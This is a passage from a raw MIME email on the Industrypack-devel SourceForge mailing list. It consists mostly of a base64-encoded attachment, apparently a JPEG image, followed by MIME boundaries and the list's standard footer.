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
Be7xKvU3qLar2HM//9k=

------=_NextPart_000_0012_14FA3AA5.B5AB4888--



--===============5642290028484320932==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5642290028484320932==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5642290028484320932==--


